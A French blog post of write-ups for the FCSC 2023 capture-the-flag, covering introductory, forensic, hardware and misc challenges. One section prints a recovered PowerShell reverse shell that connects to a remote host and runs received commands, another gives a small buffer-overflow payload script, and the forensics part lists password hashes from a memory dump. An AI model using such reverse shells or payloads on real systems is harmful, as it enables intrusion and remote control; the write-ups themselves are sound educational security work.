+++
page_template = "article.html"
title = "Writeups du FCSC 2023"
date = 2023-04-30

draft= false
[taxonomies]
tags = ["ctf", "FCSC", "writeups"]
+++

{{ resize_image(path="profil.png", width=600, height=600, op="fit")}}

Pour la première fois, je me suis décide à m'attaquer à des challenges du FCSC. J'ai préferé m'inscrire hors-categorie car je n'avais pas suffisement de temps à investir pour espérer être qualifié.


# Introduction

## Rot 13: 20 pts
### Enonce
<div class="rule">

Un de vos collègues ne jure que par cette méthode de chiffrage révolutionnaire appelée rot13.

Il l'a utilisée pour dissimuler un flag dans ce texte. Démontrez-lui qu'il a tort de supposer que cet algorithme apporte une quelconque notion de confidentialité !
```
GBQB yvfgr :
- Cnva (2 onthrggrf)
- Ynvg (1 yvger)
- Pbevnaqer (fhegbhg cnf, p'rfg cnf oba)
- 4 onanarf, 4 cbzzrf, 4 benatrf
- Cbhyrg (4 svyrgf qr cbhyrg)
- 1 synt : SPFP{rq24p7sq86p2s0515366}
- Câgrf (1xt)
- Evm (fnp qr 18xt)
- Abheve zba qvabfnher
```

</div>

### Solution

Ce challenge d'introduction fournit un texte chiffre:
```
GBQB yvfgr :
- Cnva (2 onthrggrf)
- Ynvg (1 yvger)
- Pbevnaqer (fhegbhg cnf, p'rfg cnf oba)
- 4 onanarf, 4 cbzzrf, 4 benatrf
- Cbhyrg (4 svyrgf qr cbhyrg)
- 1 synt : SPFP{rq24p7sq86p2s0515366}
- Câgrf (1xt)
- Evm (fnp qr 18xt)
- Abheve zba qvabfnher
```

On remarque une ligne qui ressemble au format du flag attendu: `FCSC{}`. Avec le titre du challenge, on se doute que le texte est chiffre par la methode **rot13**. Le site [CyberChef](https://gchq.github.io) nous donne finalement le flag

{{ resize_image(path="Pasted image 20230429134716.png", width=600, height=600, op="fit")}}

Flag: `FCSC{ed24c7fd86c2f0515366}`

##  T'es lent: 20 pts
### Enonce

<div class="rule">
Vous avez très envie de rejoindre l'organisation du FCSC 2024 et vos skills d'OSINT vous ont permis de trouver ce site en construction. Prouvez à l'équipe organisatrice que vous êtes un crack en trouvant un flag !

<a href="https://tes-lent.france-cybersecurity-challenge.fr/">https://tes-lent.france-cybersecurity-challenge.fr/</a>

</div>

### Solution

Ce challenge web commence par un site d'offres de stage pour le FCSC. Challenge d'intro oblige, on regarde la source HTML du site et on remarque un commentaire:
```html
<!--
      <div class="col-md-6">
        <div class="h-100 p-5 text-white bg-dark rounded-3">
          <h2>Générateur de noms de challenges</h2>
          <p>Vous serez en charge de trouver le noms de toutes les épreuves du FCSC 2024.</p>
          <a class="btn btn-outline-light" href="/stage-generateur-de-nom-de-challenges.html">Plus d'infos</a>
        </div>
      </div>
      -->
```
En se rendant sur la page `/stage-generateur-de-nom-de-challenges.html`, on tombe sur cette page brouillon.

{{ resize_image(path="Pasted image 20230429135046.png", width=600, height=600, op="fit")}}

Encore une fois, on regardant la source de la page, un nouveau commentaire et un nouveau lien decouvert:
```html
    <div class="container py-4">
      <!--
      Ne pas oublier d'ajouter cette annonce sur l'interface d'administration secrète : /admin-zithothiu8Yeng8iumeil5oFaeReezae.html
      -->
    </div>
```

Ce 2eme chemin cache nous enmene directement au flag!

Flag: `FCSC{237dc3b2389f224f5f94ee2d6e44abbeff0cb88852562b97291d8e171c69b9e5}`

## La gazette de Windows: 20 pts
### Enonce

<div class="rule">
Il semblerait qu'un utilisateur exécute des scripts Powershell suspects sur sa machine. Heureusement cette machine est journalisée et nous avons pu récupérer le journal d'évènements Powershell. Retrouvez ce qui a été envoyé à l'attaquant.
</div>

### Solution

Dans ce challenge, on recupere un fichier de log Windows au format `MS Windows 10-11 Event Log` . Etant sous linux, j'ai utilise [evtx](https://github.com/omerbenamram/evtx) afin de dump en json les evenements windows avec la commande `evtx_dump Microsoft-Windows-PowerShell4Operational.evtx -o json > dump.json` .

En ouvrant le dump des logs, on trouve un evenement suspect: 

{{ resize_image(path="Pasted image 20230429135947.png", width=600, height=600, op="fit")}}

On retrouve un script powershell ! On nettoie le script et on obtient:
```powershell
do {
	Start-Sleep -Seconds 1
	try{
		$TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
	} catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
	[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
	$StreamWriter.Write($String + 'SHELL> ')
	$StreamWriter.Flush()
	}

$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D
$s = ""
for ($i = 0; $i -lt 72; $i++) {
	$s += [char]([int]$l[$i] -bxor $i) #on xor chaque element de l avec sa position
}
WriteToStream $s
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
	$Output = try {
		Invoke-Expression $Command 2>&1 | Out-String
	} catch {
		$_ | Out-String
		}
	WriteToStream ($Output)
}
$StreamWriter.Close()
```
En appliquant avec un script python l'operation realisee par le for, on obtient le flag:
```Python
l = [0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D]

flag = []
for i in range(0, 72):
	flag.append(l[i]^i)
print(''.join([chr(i) for i in flag])) #FCSC{98c98d98e5a546dcf6b1ea6e47602972ea1ce9ad7262464604753c4f79b3abd3}\r\n
```

Flag: `FCSC{98c98d98e5a546dcf6b1ea6e47602972ea1ce9ad7262464604753c4f79b3abd3}`
## Tri selectif: 20 pts

### Enonce 

<div class="rule">
Vous devez trier un tableau dont vous ne voyez pas les valeurs !

nc challenges.france-cybersecurity-challenge.fr 2051
</div>

### Solution

Dans ce challenge, on nous fournit un fichier `client.py`, qui permet de communiquer avec le serveur
```Python
#!/usr/bin/env python3  
  
# python3 -m pip install pwntools  
from pwn import *  
  
# Paramètres de connexion  
HOST, PORT = "challenges.france-cybersecurity-challenge.fr", 2052  
  
def comparer(x, y):  
       io.sendlineafter(b">>> ", f"comparer {x} {y}".encode())  
       return int(io.recvline().strip().decode())  
  
def echanger(x, y):  
       io.sendlineafter(b">>> ", f"echanger {x} {y}".encode())  
  
def longueur():  
       io.sendlineafter(b">>> ", b"longueur")  
       return int(io.recvline().strip().decode())  
  
def verifier():  
       io.sendlineafter(b">>> ", b"verifier")  
       r = io.recvline().strip().decode()  
       if "flag" in r:  
               print(r)  
       else:  
               print(io.recvline().strip().decode())  
               print(io.recvline().strip().decode())  
  
def trier(lo, hi):  
   #############################  
   #   .. . Complétez ici ...  #  
   # Ajoutez votre code Python #  
   #############################  

# Ouvre la connexion au serveur  
io = remote(HOST, PORT)  
  
# Récupère la longueur du tableau  
N = longueur()  
  
# Appel de la fonction de tri que vous devez écrire  
trier(0, N - 1)  
  
# Verification  
verifier()  
  
# Fermeture de la connexion  
io.close()
```

C'est tres pratique car cela permet de se concentrer sur le challenge uniquement et pas sur l'interface avec le serveur. 
Il faut realiser un tri et il existe une grande variete d'algorithmes de tri. La [page](https://en.wikipedia.org/wiki/Sorting_algorithm#Comparison_of_algorithms) wikipedia permet d'avoir une bonne idee de quel algo utiliser et quand. J'ai decide d'implementer un tri rapide (ou quicksort en anglais) car ce challenge vient avant [Tri très selectif](#tri-tres-selectif-103-pts-six-p) ou les performances du tri ont une importance.

```Python
#!/usr/bin/env python3  
# ...
def trier(lo, hi):  
      if lo >= hi:  
       return  
      
   p = partition(lo, hi)  
   print(p)  
   trier(lo, p - 1)  
   trier(p + 1, hi)  
def partition(lo, hi):  
   print(f"{lo} {hi}")  
   pivot = hi  
   i = lo - 1  
   for j in range(lo, hi):  
       if comparer(j, pivot):  
           i +=1  
           echanger(i, j)  
   i+=1  
   echanger(i, hi)  
   return i  
# ...
```

En executant ce code, on recoit le flag.

Flag: `FCSC{e687c4749f175489512777c26c06f40801f66b8cf9da3d97bfaff4261f121459}`

## Comparaison: 20 pts

Pour le ctf, les organisateurs ont realise une machine virtuelle afin de realiser des challenges autour d'un assembleur maison. Toutes les informations concernant la VM sont disponibles sur le site du [FCSC](https://www.france-cybersecurity-challenge.fr/vm) 

### Enonce

<div class="rule">
Afin de se familiariser avec la machine virtuelle et son langage assembleur, vous devez écrire dans cette épreuve un code assembleur qui effectue une comparaison. La machine est initialisée avec deux valeurs aléatoires dans les registres `R5` et `R6`. À la fin du programme, `R0` doit contenir `1` si les valeurs sont différentes, `0` sinon.
</div>

### Solution 

Ce challenge permet de prendre en main les outils autour de la VM. Il ne presente pas de difficulte particuliere, a part comprendre comment utiliser `assembler.py` et `machine.py`.

Le code assembleur pour realiser la comparaison est tres simple

```
CMP R5, R6  
JZR JUMP  
MOV R0, #1  
STP  
JUMP:  
MOV R0, #0  
STP
```
Une fois ce code realise dans un fichier `comp`, je charge dans un script le fichier afin d'obtenir le bytecode a fournir a la machine:
```Python
comp = open("comp", 'r').read().split("\n")[:-1]  
print(assembly(comp))
```
Flag: `FCSC{6b7b0a69935108a38e58dfcb4efc857973efdc18b9db81ab9de047d3b9100b98}`

## SPAnosaurus: 20 pts

Ce challenge est une introduction aux challenges side-channel

### Enonce

<div class="rule">
La société MegaSecure vient d'éditer une mise à jour de sécurité pour leurs serveurs. Après analyse de la mise à jour, vous vous apercevez que l'éditeur utilise maintenant ce code pour l'exponentiation :

```Python
unsigned long exp_by_squaring(unsigned long x, unsigned long n) {
  // n est l'exposant secret
  if (n == 0) {
    return 1;
  } else if (n % 2 == 0) {
    return exp_by_squaring(x * x, n / 2);
  } else {
    return x * exp_by_squaring(x * x, (n - 1) / 2);
  }
}
```

Vous avez accès à un serveur où vous avez pu lancer en tant qu'utilisateur exp_by_squaring(2, 2727955623) tout en mesurant sa consommation d'énergie. L'exposant ici est donc n = 2727955623, soit 10100010100110010100110010100111 en binaire. Cette trace de consommation est sauvegardée dans trace_utilisateur.csv.

Vous avez également réussi à mesurer la consommation d'énergie pendant l'exponentiation d'une donnée de l'administrateur. Cette trace de consommation est sauvegardée dans trace_admin.csv. Saurez-vous retrouver son exposant secret n ?

Le flag est au format FCSC{1234567890} avec 1234567890 à remplacer par l'exposant secret de l'administrateur écrit en décimal.La société MegaSecure vient d'éditer une mise à jour de sécurité pour leurs serveurs. Après analyse de la mise à jour, vous vous apercevez que l'éditeur utilise maintenant ce code pour l'exponentiation :
```Python
unsigned long exp_by_squaring(unsigned long x, unsigned long n) {
  // n est l'exposant secret
  if (n == 0) {
    return 1;
  } else if (n % 2 == 0) {
    return exp_by_squaring(x * x, n / 2);
  } else {
    return x * exp_by_squaring(x * x, (n - 1) / 2);
  }
}
```

Vous avez accès à un serveur où vous avez pu lancer en tant qu'utilisateur exp_by_squaring(2, 2727955623) tout en mesurant sa consommation d'énergie. L'exposant ici est donc n = 2727955623, soit 10100010100110010100110010100111 en binaire. Cette trace de consommation est sauvegardée dans trace_utilisateur.csv.

Vous avez également réussi à mesurer la consommation d'énergie pendant l'exponentiation d'une donnée de l'administrateur. Cette trace de consommation est sauvegardée dans trace_admin.csv. Saurez-vous retrouver son exposant secret n ?

Le flag est au format FCSC{1234567890} avec 1234567890 à remplacer par l'exposant secret de l'administrateur écrit en décimal.

{{ resize_image(path="spanosaurus.png", width=600, height=600, op="fit") }}
</div>

### Solution

En observant les traces, en haut celle de l'utilisateur et en bas celle de l'admin, on remarque une partie conmmune jusqu'a 1500 puis les pics different entre 15000 et 2000. Si on considere les pics comme des 1 et les creux comme des 0, on retrouve visuellement `10100010100110010100110010100111` pour l'utilisateur. On fait de meme pour la consommation dans la trace admin, on obtient: `100101010111001110111101011`, en le representant en base 10, on trouve l'exposant secret de l admin.

Flag: `FCSC{78355947}`

## Aarg: 20 pts

### Enonce

<div class="rule">
Vous devez afficher le flag, quelque soit le moyen utilisé !
</div>

### Solution

Pour ce challenge, on nous fournit un binaire ELF, stripped et dynamiquement lie.
```bash
> aaarg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux  
3.2.0, BuildID[sha1]=f5b07c01242cc5987bed7730c2762ae0491b5ddc, stripped
```

On ouvre ghidra. On obtient un liste de fonctions avec des noms tres peu explicite car le binaire est strippe. En regardant les fonctions, on tombe sur `FUN_00401050` qui contient `  __libc_start_main(FUN_00401190,unaff_retaddr,&stack0x00000008,FUN_00401220,FUN_00401280,param_3, auStack_8);` .Cette ligne permet d'identifier la fonction main du programme, ici `FUN_00401190`.

On regarde ensuite cette derniere fonction, on trouve rapidement un segment de donnee interessant, `DAT_00402010`
```C

undefined8 FUN_00401190(int param_1,long param_2)

{
  undefined8 uVar1;
  ulong uVar2;
  char *local_10;
  
  uVar1 = 1;
  if (1 < param_1) {
    uVar2 = strtoul(*(char **)(param_2 + 8),&local_10,10);
    uVar1 = 1;
    if ((*local_10 == '\0') && (uVar1 = 2, uVar2 == (long)-param_1)) {
      uVar2 = 0;
      do {
        putc((int)(char)(&DAT_00402010)[uVar2],stdout);
        uVar2 = uVar2 + 4;
      } while (uVar2 < 278);
      putc(10,stdout);
      uVar1 = 0;
    }
  }
  return uVar1;
}
```
Dans le listing de ghidra, on remarque que cette zone de memoire contient des characteres qui ressemblent a un flag


En lisant le code, on peut aussi déduire que les charactere du flag se retrouvent tout les 4 characteres. Cela se verifie egalement avec le listing. J'ai utilisé [imHex](https://github.com/WerWolv/ImHex) (tres bon editeur hexadecimal au passage!) afin d'extraire les characteres du flag:
{{ resize_image(path="flag_aaarg.png", width=600, height=600, op="fit")}}

On finit ensuite avec un petit script python afin d'obtenir le flag.

```Python
data = bytes([
    0x46, 0xE2, 0x80, 0x8D, 0x43, 0xE2, 0x80, 0x8D, 0x53, 0xE2, 0x80, 0x8D, 0x43, 0xE2, 0x80, 0x8D, 
    0x7B, 0xE2, 0x80, 0x8D, 0x66, 0xE2, 0x80, 0x8D, 0x39, 0xE2, 0x80, 0x8D, 0x61, 0xE2, 0x80, 0x8D, 
    0x33, 0xE2, 0x80, 0x8D, 0x38, 0xE2, 0x80, 0x8D, 0x61, 0xE2, 0x80, 0x8D, 0x64, 0xE2, 0x80, 0x8D, 
    0x61, 0xE2, 0x80, 0x8D, 0x63, 0xE2, 0x80, 0x8D, 0x65, 0xE2, 0x80, 0x8D, 0x39, 0xE2, 0x80, 0x8D, 
    0x64, 0xE2, 0x80, 0x8D, 0x64, 0xE2, 0x80, 0x8D, 0x61, 0xE2, 0x80, 0x8D, 0x33, 0xE2, 0x80, 0x8D, 
    0x61, 0xE2, 0x80, 0x8D, 0x39, 0xE2, 0x80, 0x8D, 0x61, 0xE2, 0x80, 0x8D, 0x65, 0xE2, 0x80, 0x8D, 
    0x35, 0xE2, 0x80, 0x8D, 0x33, 0xE2, 0x80, 0x8D, 0x65, 0xE2, 0x80, 0x8D, 0x37, 0xE2, 0x80, 0x8D, 
    0x61, 0xE2, 0x80, 0x8D, 0x65, 0xE2, 0x80, 0x8D, 0x63, 0xE2, 0x80, 0x8D, 0x31, 0xE2, 0x80, 0x8D, 
    0x38, 0xE2, 0x80, 0x8D, 0x30, 0xE2, 0x80, 0x8D, 0x63, 0xE2, 0x80, 0x8D, 0x35, 0xE2, 0x80, 0x8D, 
    0x61, 0xE2, 0x80, 0x8D, 0x37, 0xE2, 0x80, 0x8D, 0x33, 0xE2, 0x80, 0x8D, 0x64, 0xE2, 0x80, 0x8D, 
    0x62, 0xE2, 0x80, 0x8D, 0x62, 0xE2, 0x80, 0x8D, 0x37, 0xE2, 0x80, 0x8D, 0x63, 0xE2, 0x80, 0x8D, 
    0x33, 0xE2, 0x80, 0x8D, 0x36, 0xE2, 0x80, 0x8D, 0x34, 0xE2, 0x80, 0x8D, 0x66, 0xE2, 0x80, 0x8D, 
    0x65, 0xE2, 0x80, 0x8D, 0x31, 0xE2, 0x80, 0x8D, 0x33, 0xE2, 0x80, 0x8D, 0x37, 0xE2, 0x80, 0x8D, 
    0x66, 0xE2, 0x80, 0x8D, 0x63, 0xE2, 0x80, 0x8D, 0x36, 0xE2, 0x80, 0x8D, 0x37, 0xE2, 0x80, 0x8D, 
    0x32, 0xE2, 0x80, 0x8D, 0x31, 0xE2, 0x80, 0x8D, 0x64, 0xE2, 0x80, 0x8D, 0x37, 0xE2, 0x80, 0x8D, 
    0x39, 0xE2, 0x80, 0x8D, 0x39, 0xE2, 0x80, 0x8D, 0x37, 0xE2, 0x80, 0x8D, 0x63, 0xE2, 0x80, 0x8D, 
    0x35, 0xE2, 0x80, 0x8D, 0x34, 0xE2, 0x80, 0x8D, 0x65, 0xE2, 0x80, 0x8D, 0x38, 0xE2, 0x80, 0x8D, 
    0x64, 0xE2, 0x80, 0x8D, 0x7D
])

print("".join([chr(d) for d in data if not d in [0xE2, 0x80, 0x8D]]))
```

Flag: `FCSC{f9a38adace9dda3a9ae53e7aec180c5a73dbb7c364fe137fc6721d7997c54e8d}`

## Uid: 20 pts
### Enonce

<div class="rule">
On vous demande d'exploiter le binaire fourni pour lire le fichier flag.txt qui se trouve sur le serveur distant.

nc challenges.france-cybersecurity-challenge.fr 2100
</div>

### Solution 

Dans ce challenge d'intro pwn, on recupere le binaire vulnerable. En l'ouvrant avec ghidra et en lisant le code de la fonction main, on remarque tout de suite un buffer overflow.
```c

undefined8 main(void)

{
  undefined local_38 [44]; //buffer vulnerable !
  __uid_t local_c;
  
  local_c = geteuid();
  printf("username: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_0010200f,local_38);
  if (local_c == 0) {
    system("cat flag.txt");
  }
  else {
    system("cat flop.txt");
  }
  return 0;
}

```

On doit donc remplir les 44 octets du buffer puis inserer `\x00` afin de verifier `local_c == 0`. Pour cela, un petit script python suffit amplement.

```Python
from pwn import *
HOST, PORT = "challenges.france-cybersecurity-challenge.fr", 2100
io = remote(HOST, PORT)

payload = "A"*44+'\x00'
io.sendlineafter(b"username:", payload.encode())
io.interactive()
```

Flag: `FCSC{3ce9bedca72ad9c23b1714b5882ff5036958d525d668cadeb28742c0e2c56469}`

# Forensic

## Ransomémoire 0/3 - Pour commencer: 100pts ⭐
### Enonce

<div class="rule">
Vous vous préparez à analyser une capture mémoire et vous notez quelques informations sur la machine avant de plonger dans l'analyse :

- nom d'utilisateur,
- nom de la machine,
- navigateur utilisé.

Le flag est au format FCSC{<nom d'utilisateur>:<nom de la machine>:<nom du navigateur>} où :

- <nom d'utilisateur> est le nom de l'utilisateur qui utilise la machine,
- <nom de la machine> est le nom de la machine analysée et
- <nom du navigateur> est le nom du navigateur en cours d'exécution.

Par exemple : FCSC{toto:Ordinateur-de-jojo:Firefox}.

**Attention : pour cette épreuve, vous n'avez que 10 tentatives de flag.**

Ce challenge est en 4 parties, selon le découpage initial suivant :

- Ransomémoire 0/3 - Pour commencer :
    - 500 points de départ
- Ransomémoire 1/3 - Mon précieux :
    - 500 points de départ
    - Ransomémoire 2/3 - Début d'investigation :
        - 500 points de départ débloqué après Ransomémoire 1/3 - Mon précieux
    - Ransomémoire 3/3 - Doppelgänger :
        - 500 points de départ
</div>

### Solution

Pour ce premier challenge forensic, on a un dump memoire Windows a analyser. Je sors donc volatility pour m'attaquer a l'analyse du dump.

### Recuperation du nom d'utilisateur

Afin de recuperer le nom d'utiisateur, on va utiliser `windows.hashdump` qui permet de recuperer tout les utilisateurs, leurs hashes ainsi que leur `rid`
#### Commande utilisee
`python vol.py -f dump.dmp windows.hashdump`

```bash
User    rid     lmhash  nthash  
  
Administrateur  500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0  
Invité  501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0  
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0  
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        8e6339a5717f7eab09999cc9f09f6828  
Admin   1001    aad3b435b51404eeaad3b435b51404ee        a881324bad161293dedc71817988d944
```
Le nom d'utilistateur est celui qui n'est pas genere par windows, ici `Admin`.

### Recuperation du nom de la machine
Pour recuperer le nom de la machine, on va inspecter le registre windows.
On liste d'abord les entrees des registres.
#### Commande utilisee
`python vol.py -f dump.dmp windows.registry.hivelist.HiveList`


Le registre qui nous interesse ici est `\REGISTRY\MACHINE\SYSTEM`. 

On affiche ensuite les clefs associees a cette entree. La variable importante a utiliser pour volatility est `Offset`. De plus, en regardant la documentation de microsoft, on apprend que le nom de l'ordinateur est stocke dans la clef `ControlSet001\Control\ComputerName\ComputerName`.

#### Commande utilisee
`python vol.py -f /data/lab/ctfs/fcsc/forensic/ransomemoire/fcsc.dmp windows.registry.printkey.PrintKey --key 0xe306c7889000 --key 'ControlSet001\Control\ComputerName\ComputerName'`


On obtient le nom de la machine.

### Recuperation du navigateur utilise
Pour recuperer le navigateur utilise, on affiche la liste des processus qui tournaient au moment du  dump.

#### Commande utilisee
`python vol.py -f dump.dmp windows.pslist`


Dans la liste des processus, on tombe sur celui avec le pid 6808: brave. Et voila !

Flag: `FCSC{Admin:DESKTOP-PI234PG:brave}`

# Hardware

## Fibonacci: 193 pts ⭐

### Enonce

<div class="rule">
>    Cette épreuve fait partie de la série qui utilise la machine virtuelle du FCSC 2023, plus d'informations sur celle-ci ici : https://www.france-cybersecurity-challenge.fr/vm

Cette fois, on vous demande de coder en assembleur la suite de Fibonacci.

La machine est initialisée avec une valeur n aléatoire (mise dans le registre R5) et devra contenir (dans R0) l'élément Fib(n) une fois le code exécuté. Pour rappel :

- Fib(0) = 0,
- Fib(1) = 1,
- Fib(n) = Fib(n - 1) + Fib(n - 2).

Le code machine (bytecode) sera envoyé sous un format hexadécimal, qu'on pourra générer à l'aide de l'assembleur fourni (fichier assembly.py).
</div>

### Solution
Pour ce deuxieme challenge, il faut implementer en assembleur un calcul de suite de fibonacci dont la definition est rappelee dans l'enonce.
De plus, dans le fichier `challenge.py`, on obtient une implementation en python de ce calcul
```Python
def Fib(n):  
   if n < 2:  
       return n  
   A = 0  
   B = 1  
   for _ in range(n - 1):  
       C = A + B  
       A = B  
       B = C  
   return B
```

Il suffit d'implementer en assembleur cet algo.
```
MOV R2, #1 ;A  
MOV R3, #0 ;B  
MOV R6, R5 ;N  
MOV R1, #1 ;CONSTANT  
  
MOV R4, #0  
FIB:  
CMP R6, R4  
JZA END  
SUB R6, R6, R1; N = N - 1  
ADD R7, R2, R3; C = A + B  
MOV R2, R3; A = B  
MOV R3, R7; B = C  
JA FIB  
  
END:  
MOV R0, R3  
STP
```
On recupere le bytecode: `8002000180030000005680010001800400000646880000124c764ad7003200739000000900301400` 
et le flag apparait!

Flag: `FCSC{770ac04f9f113284eeee2da655eba34af09a12dba789c19020f5fd4eff1b1907}`

# Misc 
## Tri très selectif: 103 pts ⭐
### Enonce

<div class="rule">
Comme l'épreuve Tri Sélectif, vous devez trier le tableau, mais cette fois vous devez être efficace !

nc challenges.france-cybersecurity-challenge.fr 2052
</div>

### Solution

En reprenant exactement le meme code que pour [Tri selectif](#tri-selectif-20-pts) et en changeant le port netcat, on obtient le flag directement. 2 flag pour le prix d'un !

Flag: `FCSC{6d275607ccfba86daddaa2df6115af5f5623f1f8f2dbb62606e543fc3244e33a}`

# Conclusion

Ce CTF est tres chouette, est meme les challenges que je n'ai pas reussi mais tenter m'ont appris beaucoup de choses. Gros gg aux organisateurs et je compte bien revenir l'an prochain.
